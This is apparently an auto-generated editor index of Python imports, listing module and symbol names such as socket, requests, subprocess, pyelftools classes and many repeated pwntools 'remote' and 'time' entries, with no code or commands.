[
    {
        "label": "socket",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "socket",
        "description": "socket",
        "detail": "socket",
        "documentation": {}
    },
    {
        "label": "time",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "time",
        "description": "time",
        "detail": "time",
        "documentation": {}
    },
    {
        "label": "json",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "json",
        "description": "json",
        "detail": "json",
        "documentation": {}
    },
    {
        "label": "sys",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "sys",
        "description": "sys",
        "detail": "sys",
        "documentation": {}
    },
    {
        "label": "os",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "os",
        "description": "os",
        "detail": "os",
        "documentation": {}
    },
    {
        "label": "argparse",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "argparse",
        "description": "argparse",
        "detail": "argparse",
        "documentation": {}
    },
    {
        "label": "re",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "re",
        "description": "re",
        "detail": "re",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "remote",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "time",
        "importPath": "pwn",
        "description": "pwn",
        "isExtraImport": true,
        "detail": "pwn",
        "documentation": {}
    },
    {
        "label": "requests",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "requests",
        "description": "requests",
        "detail": "requests",
        "documentation": {}
    },
    {
        "label": "runpy",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "runpy",
        "description": "runpy",
        "detail": "runpy",
        "documentation": {}
    },
    {
        "label": "annotations",
        "importPath": "__future__",
        "description": "__future__",
        "isExtraImport": true,
        "detail": "__future__",
        "documentation": {}
    },
    {
        "label": "site",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "site",
        "description": "site",
        "detail": "site",
        "documentation": {}
    },
    {
        "label": "glob",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "glob",
        "description": "glob",
        "detail": "glob",
        "documentation": {}
    },
    {
        "label": "shutil",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "shutil",
        "description": "shutil",
        "detail": "shutil",
        "documentation": {}
    },
    {
        "label": "sysconfig",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "sysconfig",
        "description": "sysconfig",
        "detail": "sysconfig",
        "documentation": {}
    },
    {
        "label": "tempfile",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "tempfile",
        "description": "tempfile",
        "detail": "tempfile",
        "documentation": {}
    },
    {
        "label": "winreg",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "winreg",
        "description": "winreg",
        "detail": "winreg",
        "documentation": {}
    },
    {
        "label": "subprocess",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "subprocess",
        "description": "subprocess",
        "detail": "subprocess",
        "documentation": {}
    },
    {
        "label": "os,",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "os.",
        "description": "os.",
        "detail": "os.",
        "documentation": {}
    },
    {
        "label": "string",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "string",
        "description": "string",
        "detail": "string",
        "documentation": {}
    },
    {
        "label": "traceback",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "traceback",
        "description": "traceback",
        "detail": "traceback",
        "documentation": {}
    },
    {
        "label": "itertools",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "itertools",
        "description": "itertools",
        "detail": "itertools",
        "documentation": {}
    },
    {
        "label": "__version__",
        "importPath": "elftools",
        "description": "elftools",
        "isExtraImport": true,
        "detail": "elftools",
        "documentation": {}
    },
    {
        "label": "ELFError",
        "importPath": "elftools.common.exceptions",
        "description": "elftools.common.exceptions",
        "isExtraImport": true,
        "detail": "elftools.common.exceptions",
        "documentation": {}
    },
    {
        "label": "bytes2str",
        "importPath": "elftools.common.utils",
        "description": "elftools.common.utils",
        "isExtraImport": true,
        "detail": "elftools.common.utils",
        "documentation": {}
    },
    {
        "label": "iterbytes",
        "importPath": "elftools.common.utils",
        "description": "elftools.common.utils",
        "isExtraImport": true,
        "detail": "elftools.common.utils",
        "documentation": {}
    },
    {
        "label": "ELFFile",
        "importPath": "elftools.elf.elffile",
        "description": "elftools.elf.elffile",
        "isExtraImport": true,
        "detail": "elftools.elf.elffile",
        "documentation": {}
    },
    {
        "label": "DynamicSection",
        "importPath": "elftools.elf.dynamic",
        "description": "elftools.elf.dynamic",
        "isExtraImport": true,
        "detail": "elftools.elf.dynamic",
        "documentation": {}
    },
    {
        "label": "DynamicSegment",
        "importPath": "elftools.elf.dynamic",
        "description": "elftools.elf.dynamic",
        "isExtraImport": true,
        "detail": "elftools.elf.dynamic",
        "documentation": {}
    },
    {
        "label": "ENUM_D_TAG",
        "importPath": "elftools.elf.enums",
        "description": "elftools.elf.enums",
        "isExtraImport": true,
        "detail": "elftools.elf.enums",
        "documentation": {}
    },
    {
        "label": "InterpSegment",
        "importPath": "elftools.elf.segments",
        "description": "elftools.elf.segments",
        "isExtraImport": true,
        "detail": "elftools.elf.segments",
        "documentation": {}
    },
    {
        "label": "NoteSection",
        "importPath": "elftools.elf.sections",
        "description": "elftools.elf.sections",
        "isExtraImport": true,
        "detail": "elftools.elf.sections",
        "documentation": {}
    },
    {
        "label": "SymbolTableSection",
        "importPath": "elftools.elf.sections",
        "description": "elftools.elf.sections",
        "isExtraImport": true,
        "detail": "elftools.elf.sections",
        "documentation": {}
    },
    {
        "label": "SymbolTableIndexSection",
        "importPath": "elftools.elf.sections",
        "description": "elftools.elf.sections",
        "isExtraImport": true,
        "detail": "elftools.elf.sections",
        "documentation": {}
    },
    {
        "label": "GNUVerSymSection",
        "importPath": "elftools.elf.gnuversions",
        "description": "elftools.elf.gnuversions",
        "isExtraImport": true,
        "detail": "elftools.elf.gnuversions",
        "documentation": {}
    },
    {
        "label": "GNUVerDefSection",
        "importPath": "elftools.elf.gnuversions",
        "description": "elftools.elf.gnuversions",
        "isExtraImport": true,
        "detail": "elftools.elf.gnuversions",
        "documentation": {}
    },
    {
        "label": "GNUVerNeedSection",
        "importPath": "elftools.elf.gnuversions",
        "description": "elftools.elf.gnuversions",
        "isExtraImport": true,
        "detail": "elftools.elf.gnuversions",
        "documentation": {}
    },
    {
        "label": "RelocationSection",
        "importPath": "elftools.elf.relocation",
        "description": "elftools.elf.relocation",
        "isExtraImport": true,
        "detail": "elftools.elf.relocation",
        "documentation": {}
    },
    {
        "label": "describe_ei_class",
        "importPath": "elftools.elf.descriptions",
        "description": "elftools.elf.descriptions",
        "isExtraImport": true,
        "detail": "elftools.elf.descriptions",
        "documentation": {}
    },
    {
        "label": "describe_ei_data",
        "importPath": "elftools.elf.descriptions",
        "description": "elftools.elf.descriptions",
        "isExtraImport": true,
        "detail": "elftools.elf.descriptions",
        "documentation": {}
    },
    {
        "label": "describe_ei_version",
        "importPath": "elftools.elf.descriptions",
        "description": "elftools.elf.descriptions",
        "isExtraImport": true,
        "detail": "elftools.elf.descriptions",
        "documentation": {}
    },
    {
        "label": "describe_ei_osabi",
        "importPath": "elftools.elf.descriptions",
        "description": "elftools.elf.descriptions",
        "isExtraImport": true,
        "detail": "elftools.elf.descriptions",
        "documentation": {}
    },
    {
        "label": "describe_e_type",
        "importPath": "elftools.elf.descriptions",
        "description": "elftools.elf.descriptions",
        "isExtraImport": true,
        "detail": "elftools.elf.descriptions",
        "documentation": {}
    },
    {
        "label": "describe_e_machine",
        "importPath": "elftools.elf.descriptions",
        "description": "elftools.elf.descriptions",
        "isExtraImport": true,
        "detail": "elftools.elf.descriptions",
        "documentation": {}
    },
    {
        "label": "describe_e_version_numeric",
        "importPath": "elftools.elf.descriptions",
        "description": "elftools.elf.descriptions",
        "isExtraImport": true,
        "detail": "elftools.elf.descriptions",
        "documentation": {}
    },
    {
        "label": "describe_p_type",
        "importPath": "elftools.elf.descriptions",
        "description": "elftools.elf.descriptions",
        "isExtraImport": true,
        "detail": "elftools.elf.descriptions",
        "documentation": {}
    },
    {
        "label": "describe_p_flags",
        "importPath": "elftools.elf.descriptions",
        "description": "elftools.elf.descriptions",
        "isExtraImport": true,
        "detail": "elftools.elf.descriptions",
        "documentation": {}
    },
    {
        "label": "describe_rh_flags",
        "importPath": "elftools.elf.descriptions",
        "description": "elftools.elf.descriptions",
        "isExtraImport": true,
        "detail": "elftools.elf.descriptions",
        "documentation": {}
    },
    {
        "label": "describe_sh_type",
        "importPath": "elftools.elf.descriptions",
        "description": "elftools.elf.descriptions",
        "isExtraImport": true,
        "detail": "elftools.elf.descriptions",
        "documentation": {}
    },
    {
        "label": "describe_sh_flags",
        "importPath": "elftools.elf.descriptions",
        "description": "elftools.elf.descriptions",
        "isExtraImport": true,
        "detail": "elftools.elf.descriptions",
        "documentation": {}
    },
    {
        "label": "describe_symbol_type",
        "importPath": "elftools.elf.descriptions",
        "description": "elftools.elf.descriptions",
        "isExtraImport": true,
        "detail": "elftools.elf.descriptions",
        "documentation": {}
    },
    {
        "label": "describe_symbol_bind",
        "importPath": "elftools.elf.descriptions",
        "description": "elftools.elf.descriptions",
        "isExtraImport": true,
        "detail": "elftools.elf.descriptions",
        "documentation": {}
    },
    {
        "label": "describe_symbol_visibility",
        "importPath": "elftools.elf.descriptions",
        "description": "elftools.elf.descriptions",
        "isExtraImport": true,
        "detail": "elftools.elf.descriptions",
        "documentation": {}
    },
    {
        "label": "describe_symbol_shndx",
        "importPath": "elftools.elf.descriptions",
        "description": "elftools.elf.descriptions",
        "isExtraImport": true,
        "detail": "elftools.elf.descriptions",
        "documentation": {}
    },
    {
        "label": "describe_reloc_type",
        "importPath": "elftools.elf.descriptions",
        "description": "elftools.elf.descriptions",
        "isExtraImport": true,
        "detail": "elftools.elf.descriptions",
        "documentation": {}
    },
    {
        "label": "describe_dyn_tag",
        "importPath": "elftools.elf.descriptions",
        "description": "elftools.elf.descriptions",
        "isExtraImport": true,
        "detail": "elftools.elf.descriptions",
        "documentation": {}
    },
    {
        "label": "describe_dt_flags",
        "importPath": "elftools.elf.descriptions",
        "description": "elftools.elf.descriptions",
        "isExtraImport": true,
        "detail": "elftools.elf.descriptions",
        "documentation": {}
    },
    {
        "label": "describe_dt_flags_1",
        "importPath": "elftools.elf.descriptions",
        "description": "elftools.elf.descriptions",
        "isExtraImport": true,
        "detail": "elftools.elf.descriptions",
        "documentation": {}
    },
    {
        "label": "describe_ver_flags",
        "importPath": "elftools.elf.descriptions",
        "description": "elftools.elf.descriptions",
        "isExtraImport": true,
        "detail": "elftools.elf.descriptions",
        "documentation": {}
    },
    {
        "label": "describe_note",
        "importPath": "elftools.elf.descriptions",
        "description": "elftools.elf.descriptions",
        "isExtraImport": true,
        "detail": "elftools.elf.descriptions",
        "documentation": {}
    },
    {
        "label": "describe_attr_tag_arm",
        "importPath": "elftools.elf.descriptions",
        "description": "elftools.elf.descriptions",
        "isExtraImport": true,
        "detail": "elftools.elf.descriptions",
        "documentation": {}
    },
    {
        "label": "describe_attr_tag_riscv",
        "importPath": "elftools.elf.descriptions",
        "description": "elftools.elf.descriptions",
        "isExtraImport": true,
        "detail": "elftools.elf.descriptions",
        "documentation": {}
    },
    {
        "label": "describe_symbol_other",
        "importPath": "elftools.elf.descriptions",
        "description": "elftools.elf.descriptions",
        "isExtraImport": true,
        "detail": "elftools.elf.descriptions",
        "documentation": {}
    },
    {
        "label": "E_FLAGS",
        "importPath": "elftools.elf.constants",
        "description": "elftools.elf.constants",
        "isExtraImport": true,
        "detail": "elftools.elf.constants",
        "documentation": {}
    },
    {
        "label": "E_FLAGS_MASKS",
        "importPath": "elftools.elf.constants",
        "description": "elftools.elf.constants",
        "isExtraImport": true,
        "detail": "elftools.elf.constants",
        "documentation": {}
    },
    {
        "label": "SH_FLAGS",
        "importPath": "elftools.elf.constants",
        "description": "elftools.elf.constants",
        "isExtraImport": true,
        "detail": "elftools.elf.constants",
        "documentation": {}
    },
    {
        "label": "SHN_INDICES",
        "importPath": "elftools.elf.constants",
        "description": "elftools.elf.constants",
        "isExtraImport": true,
        "detail": "elftools.elf.constants",
        "documentation": {}
    },
    {
        "label": "DWARFInfo",
        "importPath": "elftools.dwarf.dwarfinfo",
        "description": "elftools.dwarf.dwarfinfo",
        "isExtraImport": true,
        "detail": "elftools.dwarf.dwarfinfo",
        "documentation": {}
    },
    {
        "label": "describe_reg_name",
        "importPath": "elftools.dwarf.descriptions",
        "description": "elftools.dwarf.descriptions",
        "isExtraImport": true,
        "detail": "elftools.dwarf.descriptions",
        "documentation": {}
    },
    {
        "label": "describe_attr_value",
        "importPath": "elftools.dwarf.descriptions",
        "description": "elftools.dwarf.descriptions",
        "isExtraImport": true,
        "detail": "elftools.dwarf.descriptions",
        "documentation": {}
    },
    {
        "label": "set_global_machine_arch",
        "importPath": "elftools.dwarf.descriptions",
        "description": "elftools.dwarf.descriptions",
        "isExtraImport": true,
        "detail": "elftools.dwarf.descriptions",
        "documentation": {}
    },
    {
        "label": "describe_CFI_instructions",
        "importPath": "elftools.dwarf.descriptions",
        "description": "elftools.dwarf.descriptions",
        "isExtraImport": true,
        "detail": "elftools.dwarf.descriptions",
        "documentation": {}
    },
    {
        "label": "describe_CFI_register_rule",
        "importPath": "elftools.dwarf.descriptions",
        "description": "elftools.dwarf.descriptions",
        "isExtraImport": true,
        "detail": "elftools.dwarf.descriptions",
        "documentation": {}
    },
    {
        "label": "describe_CFI_CFA_rule",
        "importPath": "elftools.dwarf.descriptions",
        "description": "elftools.dwarf.descriptions",
        "isExtraImport": true,
        "detail": "elftools.dwarf.descriptions",
        "documentation": {}
    },
    {
        "label": "describe_DWARF_expr",
        "importPath": "elftools.dwarf.descriptions",
        "description": "elftools.dwarf.descriptions",
        "isExtraImport": true,
        "detail": "elftools.dwarf.descriptions",
        "documentation": {}
    },
    {
        "label": "DW_LNS_copy",
        "importPath": "elftools.dwarf.constants",
        "description": "elftools.dwarf.constants",
        "isExtraImport": true,
        "detail": "elftools.dwarf.constants",
        "documentation": {}
    },
    {
